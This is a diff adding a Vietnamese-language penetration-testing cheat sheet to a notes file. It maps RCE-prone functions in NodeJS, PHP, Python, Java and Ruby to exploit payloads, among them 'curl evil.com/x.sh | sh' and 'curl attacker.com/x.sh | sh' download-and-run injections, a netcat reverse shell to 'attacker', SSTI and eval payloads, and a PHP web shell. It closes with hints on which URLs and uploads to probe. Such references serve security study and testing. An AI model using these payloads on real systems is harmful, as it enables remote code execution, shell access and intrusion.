@@ -1,3 +1,33 @@
+
+---
+
+## 🔍 Bảng tóm tắt "ngôn ngữ → hàm RCE → payload minh hoạ"
+
+| 🧠 Ngôn ngữ | ☠️ Hàm dễ bị RCE                             | 🔥 Ví dụ payload khai thác                       |        |
+| ----------- | -------------------------------------------- | ------------------------------------------------ | ------ |
+| **NodeJS**  | `child_process.exec()`                       | \`127.0.0.1; curl evil.com/x.sh                  | sh\`   |
+|             | `eval()` / `Function()`                      | `");require('child_process').exec('id');//`      |        |
+|             | `res.render()` (SSTI)                        | `<%= require('child_process').execSync("id") %>` |        |
+| **PHP**     | `eval()`, `system()`, `exec()`, `passthru()` | `php?cmd=ls` với `system($_GET["cmd"]);`         |        |
+|             | `preg_replace('/e')` (cũ)                    | `/\/e/i` kết hợp với `"${phpinfo()}"`            |        |
+| **Python**  | `os.system()`, `subprocess.Popen()`          | `127.0.0.1 && nc attacker 4444 -e /bin/bash`     |        |
+|             | `eval()` / `exec()`                          | `__import__('os').system('id')`                  |        |
+|             | `pickle.loads()`                             | Payload pickle inject: RCE qua serialized object |        |
+| **Java**    | `Runtime.getRuntime().exec()`                | `"ping -c 1 attacker.com"`                       |        |
+|             | Deserialization RCE (commons-collections)    | Gadget chain `.readObject()` => reverse shell    |        |
+| **Ruby**    | `eval()`, `system()`, backticks \`\`\`       | `\`curl attacker.com/x.sh                        | sh\`\` |
+|             | `send()`                                     | `"send(:eval, 'system(\"id\")')"`                |        |
+
+---
+
+## 🚨 Gợi ý khai thác theo ngữ cảnh:
+
+* **Nếu URL có `/ping`, `/convert`, `/run`, `/template` →** test payload command injection.
+* **Nếu có truyền dữ liệu user → render ra giao diện (template engine)** → test SSTI.
+* **Nếu thấy JSON chứa `"data": "code here"` →** test eval hoặc exec.
+* **Nếu có upload file `.pkl`, `.ser`, `.php`, `.rb` →** thử inject object RCE.
+
+---
 ># ```<?php system(\$_GET['cmd']); ?>```
 
 ---
